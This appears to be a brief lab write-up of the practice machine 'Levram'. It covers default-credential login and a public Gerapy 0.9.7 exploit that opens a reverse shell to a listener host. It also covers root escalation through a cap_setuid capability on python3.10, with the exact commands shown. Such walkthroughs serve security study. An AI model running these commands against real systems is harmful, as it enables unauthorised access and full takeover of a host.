# 🐍 Levram (Linux)

## 🌐 Initial Foothold

- 🌍 Accessed the web interface at: `http://192.168.116.24:8000`
- 🔑 Logged in using default credentials: `admin:admin`
- 🛠️ Exploited **Gerapy 0.9.7** using the Python script `50640.py`
- 🧪 Created a project via the web interface at `/#/project`
- 📡 Started a listener on port 22 (though unclear if required)
- 🚀 Executed the following command to trigger the reverse shell:
  ```bash
  python 50640.py -t 192.168.116.24 -p 8000 -L 192.168.45.166 -P 22
  ```

## 🧑‍💻 Privilege Escalation

- 🔍 Ran `linpeas.sh` and discovered:
  ```
  /usr/bin/python3.10 cap_setuid=ep
  ```
- 📚 Referenced articles:
  - [🔗 Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
  - [🔗 HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html)
- 🔓 Gained root shell with:
  ```bash
  /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```

---

## 🔑 Key Takeaways

- 🗺️ Always check web interfaces and default credentials
- 🐍 Exploiting Python Capabilities can easily lead to root
- 🧪 Debugging dev tools like Gerapy may introduce serious vulnerabilities
- ⚙️ Capabilities misconfiguration is a critical vector for privilege escalation
